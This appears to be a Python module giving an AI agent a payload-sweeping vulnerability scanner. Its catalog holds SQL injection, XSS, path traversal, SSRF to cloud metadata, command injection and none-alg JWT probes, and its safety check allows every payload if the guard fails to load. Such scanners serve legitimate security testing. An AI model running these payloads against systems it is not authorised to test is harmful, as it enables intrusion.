"""
Payload sweeper: systematic parameter variation at agent level (Issue #169).

Exposes a `sweep_payloads` tool that lets the agent try N variants against a
single endpoint and returns structured results sorted by hit-score. This fills
the gap between scanner-native fuzzing (sqlmap/nuclei/ffuf) and single-shot
http_request calls.

Non-destructive by design: all payloads in PAYLOAD_CATALOG are read-only
oracle probes (boolean/time-based SQLi, reflected XSS, path traversal to
/etc/hostname, etc.) — validated by safety_guard before send.

Oracle heuristics:
  - boolean:   compare response signature delta between true/false payload pairs
  - time:      measure wall-clock; >2s over baseline ⇒ hit
  - reflection: payload appears unescaped in response body
  - error:     response body contains known error strings
"""

from __future__ import annotations

import logging
import re
import statistics
import time
from dataclasses import dataclass, field, asdict
from typing import Any

log = logging.getLogger(__name__)

_MAX_VARIANTS = 50
_DEFAULT_DELAY_MS = 100
_TIME_ORACLE_THRESHOLD_S = 2.5


# ── Payload catalog ────────────────────────────────────────────────────────
# All payloads are read-only oracle probes. Do not add data-modifying or
# shell-spawning payloads here; safety_guard enforces this as well.

PAYLOAD_CATALOG: dict[str, list[dict]] = {
    "sqli_boolean": [
        {"payload": "' OR '1'='1", "kind": "true"},
        {"payload": "' OR '1'='2", "kind": "false"},
        {"payload": "\" OR \"1\"=\"1", "kind": "true"},
        {"payload": "\" OR \"1\"=\"2", "kind": "false"},
        {"payload": "1 OR 1=1", "kind": "true"},
        {"payload": "1 OR 1=2", "kind": "false"},
        {"payload": "') OR ('1'='1", "kind": "true"},
        {"payload": "') OR ('1'='2", "kind": "false"},
    ],
    "sqli_time": [
        {"payload": "' AND SLEEP(4)--", "kind": "time"},
        {"payload": "' AND pg_sleep(4)--", "kind": "time"},
        {"payload": "'; WAITFOR DELAY '0:0:4'--", "kind": "time"},
        {"payload": "' AND BENCHMARK(5000000,MD5(1))--", "kind": "time"},
    ],
    "sqli_error": [
        {"payload": "'", "kind": "error"},
        {"payload": "\"", "kind": "error"},
        {"payload": "\\", "kind": "error"},
        {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "kind": "error"},
    ],
    "xss_reflected": [
        {"payload": "<script>alert(1)</script>", "kind": "reflection"},
        {"payload": "\"><script>alert(1)</script>", "kind": "reflection"},
        {"payload": "'><img src=x onerror=alert(1)>", "kind": "reflection"},
        {"payload": "<svg/onload=alert(1)>", "kind": "reflection"},
        {"payload": "javascript:alert(1)", "kind": "reflection"},
        {"payload": "<body onload=alert(1)>", "kind": "reflection"},
    ],
    "path_traversal": [
        {"payload": "../../../../etc/hostname", "kind": "content"},
        {"payload": "..\\..\\..\\..\\windows\\win.ini", "kind": "content"},
        {"payload": "....//....//....//etc/hostname", "kind": "content"},
        {"payload": "%2e%2e%2f%2e%2e%2fetc%2fhostname", "kind": "content"},
        {"payload": "/etc/hostname%00", "kind": "content"},
    ],
    "open_redirect": [
        {"payload": "//evil.example.com", "kind": "redirect"},
        {"payload": "https://evil.example.com", "kind": "redirect"},
        {"payload": "//google.com", "kind": "redirect"},
        {"payload": "/\\evil.example.com", "kind": "redirect"},
    ],
    "ssrf_internal": [
        {"payload": "http://169.254.169.254/latest/meta-data/", "kind": "content"},
        {"payload": "http://127.0.0.1:22", "kind": "connect"},
        {"payload": "http://localhost:6379", "kind": "connect"},
        {"payload": "http://[::1]:80", "kind": "connect"},
        {"payload": "file:///etc/hostname", "kind": "content"},
    ],
    "cmd_injection_safe": [
        # Only read-only, output-inspectable commands
        {"payload": "; id", "kind": "reflection"},
        {"payload": "| id", "kind": "reflection"},
        {"payload": "`id`", "kind": "reflection"},
        {"payload": "$(id)", "kind": "reflection"},
        {"payload": "; whoami", "kind": "reflection"},
        {"payload": "| sleep 4", "kind": "time"},
        {"payload": "; sleep 4", "kind": "time"},
    ],
    "graphql_introspection": [
        {"payload": "{__schema{queryType{name}}}", "kind": "graphql"},
        {"payload": "{__schema{types{name}}}", "kind": "graphql"},
        {"payload": "{__type(name:\"User\"){fields{name}}}", "kind": "graphql"},
    ],
    "jwt_tamper": [
        # None-alg and alg-confusion probes (decoded so the agent / safety guard can
        # inspect them). Real JWT tampering requires knowing the original token
        # structure; these are probes for alg confusion.
        {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.", "kind": "auth"},
    ],
}


SQL_ERROR_SIGNATURES = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-00933",
    "ora-00921",
    "pg::syntaxerror",
    "pg_query():",
    "sqlite3::",
    "sqlitedatabaseerror",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "syntax error at or near",
    "mysql_fetch",
    "psycopg2",
)

PATH_TRAVERSAL_SIGNATURES = (
    "root:x:0:0:",      # /etc/passwd hit
    "[fonts]",          # win.ini hit
)


# ── Data classes ──────────────────────────────────────────────────────────

@dataclass
class SweepResultItem:
    payload: str
    status_code: int | None
    response_length: int | None
    response_time_s: float | None
    hit_score: float
    hit_reason: str
    error: str | None = None


# ── Safety check ──────────────────────────────────────────────────────────

def _safety_check(payload: str, vuln_class: str) -> tuple[bool, str]:
    """Return (is_safe, reason). Uses existing safety_guard deny-list."""
    try:
        from modules.agent.safety_guard import get_safety_guard
        from modules.agent.exploitation_engine import ExploitType
        # Map vuln_class → exploit type; default to a permissive category for
        # classes outside the enum.
        mapping = {
            "sqli_boolean": ExploitType.SQLI,
            "sqli_time":    ExploitType.SQLI,
            "sqli_error":   ExploitType.SQLI,
            "xss_reflected": ExploitType.XSS,
            "path_traversal": ExploitType.PATH_TRAVERSAL,
            "ssrf_internal": ExploitType.SSRF,
            "cmd_injection_safe": ExploitType.COMMAND_INJECTION,
            "open_redirect": ExploitType.AUTH_BYPASS,  # closest category
            "graphql_introspection": ExploitType.API_VULNERABILITY,
            "jwt_tamper":  ExploitType.AUTH_BYPASS,
        }
        etype = mapping.get(vuln_class, ExploitType.API_VULNERABILITY)
        return get_safety_guard().validate_payload(payload, etype)
    except Exception as e:
        log.debug("safety_guard unavailable, falling back to allow: %s", e)
        return True, ""


# ── Oracle scoring ────────────────────────────────────────────────────────

def _score_response(
    payload: str,
    kind: str,
    status: int | None,
    body: str,
    elapsed: float,
    baseline_elapsed: float | None,
    baseline_len: int | None,
) -> tuple[float, str]:
    body_lower = (body or "").lower()

    # Time-based oracle
    if kind == "time":
        if baseline_elapsed is None:
            threshold = _TIME_ORACLE_THRESHOLD_S
        else:
            threshold = baseline_elapsed + _TIME_ORACLE_THRESHOLD_S
        if elapsed >= threshold:
            return 0.9, f"time_delta={elapsed:.2f}s>{threshold:.2f}s"
        return 0.05, "no_time_delta"

    # Error signature oracle
    if kind == "error":
        for sig in SQL_ERROR_SIGNATURES:
            if sig in body_lower:
                return 0.85, f"sql_error_signature:{sig[:30]}"
        if status and status >= 500:
            return 0.4, f"http_{status}"
        return 0.05, "no_error"

    # Reflection oracle — payload appears unescaped in response
    if kind == "reflection":
        if payload and payload in (body or ""):
            return 0.75, "payload_reflected_unescaped"
        # Lower score if escaped version present
        return 0.05, "no_reflection"

    # Path-traversal content oracle
    if kind == "content":
        for sig in PATH_TRAVERSAL_SIGNATURES:
            if sig in body_lower:
                return 0.95, f"file_signature:{sig}"
        # Weaker hit: unexpected 200 with short plain-text response on a path
        if status == 200 and body and len(body) < 1024 and "<" not in body[:30]:
            return 0.35, "plain_short_200"
        return 0.05, "no_content"

    # Redirect oracle — response indicates location to an external host
    if kind == "redirect":
        if status in (301, 302, 303, 307, 308):
            return 0.7, f"http_{status}"
        return 0.05, "no_redirect"

    # Boolean-delta oracle
    if kind in ("true", "false"):
        # Scoring for boolean is post-hoc (pair comparison done outside)
        return 0.0, "pair_pending"

    # GraphQL introspection oracle
    if kind == "graphql":
        if "__schema" in body_lower or "queryType" in body:
            return 0.8, "graphql_introspection_allowed"
        return 0.05, "no_graphql"

    # Auth probe oracle
    if kind == "auth":
        if status and status in (200, 201):
            return 0.6, f"auth_accepted_{status}"
        return 0.05, "no_auth_hit"

    # Default connection hit (for ssrf connect)
    if kind == "connect":
        if status and 200 <= status < 400:
            return 0.5, f"internal_reachable_{status}"
        return 0.05, "no_connect"

    # Generic connect success
    if status and status >= 500:
        return 0.3, f"http_{status}"
    return 0.0, "default"


# ── The sweep ─────────────────────────────────────────────────────────────

def _inject(url: str, param: str | None, payload: str) -> tuple[str, dict]:
    """Build (url, body) — if param is given, replace or append it in the URL
    query string, else return body with {"payload": payload} dict for POST."""
    if param is None:
        # POST mode — caller supplies body
        return url, {"payload": payload}
    from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
    parts = urlparse(url)
    params = dict(parse_qsl(parts.query, keep_blank_values=True))
    params[param] = payload
    new_query = urlencode(params)
    new_url = urlunparse(parts._replace(query=new_query))
    return new_url, {}


def sweep(
    url: str,
    vulnerability_class: str,
    method: str = "GET",
    parameter: str | None = None,
    extra_headers: dict | None = None,
    max_variants: int = 20,
    delay_ms: int = _DEFAULT_DELAY_MS,
    session_headers: dict | None = None,
    session_cookies: dict | None = None,
) -> dict:
    """Execute a payload sweep against a single endpoint.

    Returns a structured result dict:
      {
        "vulnerability_class": "sqli_boolean",
        "url": "...",
        "total_variants": N,
        "variants": [SweepResultItem...],
        "top_hits": [...],
      }
    """
    variants = PAYLOAD_CATALOG.get(vulnerability_class)
    if not variants:
        return {
            "error": f"Unknown vulnerability_class '{vulnerability_class}'. "
                     f"Available: {sorted(PAYLOAD_CATALOG.keys())}"
        }

    max_variants = min(max(1, max_variants), _MAX_VARIANTS)
    variants = variants[:max_variants]

    # Safety filter
    safe_variants = []
    blocked: list[dict] = []
    for v in variants:
        ok, reason = _safety_check(v["payload"], vulnerability_class)
        if ok:
            safe_variants.append(v)
        else:
            blocked.append({"payload": v["payload"], "reason": reason})

    if not safe_variants:
        return {
            "error": "All payloads blocked by safety guard",
            "blocked": blocked,
        }

    # Baseline request to calibrate oracles
    try:
        import httpx
    except ImportError:
        return {"error": "httpx not available"}

    hdrs = dict(session_headers or {})
    hdrs.update(extra_headers or {})
    cookies = dict(session_cookies or {})

    baseline_len = None
    baseline_elapsed = None
    try:
        with httpx.Client(timeout=15, follow_redirects=False) as client:
            t0 = time.time()
            r = client.request(method, url, headers=hdrs, cookies=cookies)
            baseline_elapsed = time.time() - t0
            baseline_len = len(r.content or b"")
    except Exception as e:
        log.debug("baseline request failed: %s", e)

    results: list[SweepResultItem] = []
    with httpx.Client(timeout=15, follow_redirects=False) as client:
        for v in safe_variants:
            payload = v["payload"]
            kind = v["kind"]
            req_url, body_extra = _inject(url, parameter, payload)

            try:
                t0 = time.time()
                if method.upper() in ("POST", "PUT", "PATCH"):
                    data = {"payload": payload, **body_extra} if not parameter else None
                    r = client.request(
                        method, req_url,
                        headers=hdrs, cookies=cookies,
                        data=data,
                    )
                else:
                    r = client.request(method, req_url, headers=hdrs, cookies=cookies)
                elapsed = time.time() - t0
                body = r.text[:20_000]
                score, reason = _score_response(
                    payload, kind, r.status_code, body, elapsed,
                    baseline_elapsed, baseline_len,
                )
                results.append(SweepResultItem(
                    payload=payload,
                    status_code=r.status_code,
                    response_length=len(r.content or b""),
                    response_time_s=round(elapsed, 3),
                    hit_score=score,
                    hit_reason=reason,
                ))
            except Exception as e:
                results.append(SweepResultItem(
                    payload=payload,
                    status_code=None,
                    response_length=None,
                    response_time_s=None,
                    hit_score=0.0,
                    hit_reason="error",
                    error=f"{type(e).__name__}: {e}",
                ))

            if delay_ms > 0:
                time.sleep(delay_ms / 1000.0)

    # Boolean-pair post-scoring — if we have true/false variant pairs, bump
    # their scores by the response-signature delta.
    if vulnerability_class == "sqli_boolean":
        trues = [r for r, v in zip(results, safe_variants) if v["kind"] == "true"]
        falses = [r for r, v in zip(results, safe_variants) if v["kind"] == "false"]
        if trues and falses:
            true_med = statistics.median([t.response_length or 0 for t in trues])
            false_med = statistics.median([f.response_length or 0 for f in falses])
            delta = abs(true_med - false_med)
            if delta > 50:
                for r in trues:
                    r.hit_score = min(1.0, max(r.hit_score, 0.7))
                    r.hit_reason = f"boolean_delta={delta}"

    variants_out = [asdict(r) for r in results]
    top_hits = sorted(variants_out, key=lambda x: x["hit_score"], reverse=True)[:5]

    return {
        "vulnerability_class": vulnerability_class,
        "url": url,
        "method": method,
        "parameter": parameter,
        "total_variants": len(variants_out),
        "blocked_variants": blocked,
        "baseline_response_length": baseline_len,
        "baseline_response_time_s": round(baseline_elapsed, 3) if baseline_elapsed else None,
        "variants": variants_out,
        "top_hits": top_hits,
        "summary": (
            f"Swept {len(variants_out)} payloads of class {vulnerability_class}. "
            f"Top hit score: {top_hits[0]['hit_score'] if top_hits else 0}"
        ),
    }
